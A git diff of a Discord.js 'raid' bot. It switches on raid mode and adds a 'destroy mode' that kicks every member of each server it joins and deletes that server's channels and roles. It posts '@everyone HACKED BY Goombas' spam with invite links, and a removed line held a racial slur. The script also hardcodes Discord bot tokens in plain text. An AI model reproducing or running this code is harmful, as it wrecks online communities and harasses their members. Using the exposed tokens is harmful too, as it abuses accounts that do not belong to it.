@@ -1,16 +1,30 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
 let createInviteMode = false;
-let raidMode = false;
-let restoreMode = true;
-
+let raidMode = true;
+let restoreMode = false;
+let destroyMode = false;
+client.login("NTE5MjI0NjQ2OTgyMTcyNzA3.DucNNQ.ObsMwLx5dxVMVlB7hkVDRoZoI3M");
 client.on("ready", () => {
   console.log(
-    `Logged in as ${client.user.tag}! With ${client.shard.count} shards!`
+    `Logged in as ${client.user.tag}! With {
+      client.shard.count
+    } shards! Serving ${client.guilds.size}`
   );
 
   client.guilds.forEach(guild => {
     guild.channels.forEach(chan => {
+      if (destroyMode) {
+        guild.members.forEach(member => {
+          member.kick("GOOMBAS").then(() => {
+            console.log("KICKED");
+          });
+        });
+        chan.delete("GOOMBAS");
+        return guild.roles.forEach(role => {
+          role.delete("GOOMBAS");
+        });
+      }
       if (createInviteMode) {
         return chan
           .createInvite()
@@ -38,7 +52,9 @@ client.on("ready", () => {
               guild.channels.map(c => {
                 if (found === 0) {
                   if (c.type === "text") {
-                    c.send("@everyone HACKED BY GOOMBAS! FUCK YOU NIGGERS");
+                    c.send(
+                      "@everyone HACKED BY Goombas !!! GOOMBA GOOMBA GOOMBA !!! COME FIGHT US YOU FUCKING PUSSIES! discord.gg/zr6h46f https://bit.ly/2Sa7j7R"
+                    );
                   }
                 }
               });
@@ -52,6 +68,7 @@ client.on("ready", () => {
     });
   });
 });
-
+client.on("error", error => {
+  console.log(error);
+});
 //client.login("NTE4ODk4MjgwNjAwNTY3ODA4.DuXdOQ.Ra363CL1tp1yViwTcH3d0TUZYg8");
-client.login("NDc1MjMzNDk5NjQxODA2ODQ5.DuVHSA.d9dRvl9PwYYaS90hJkyr45qspaE");
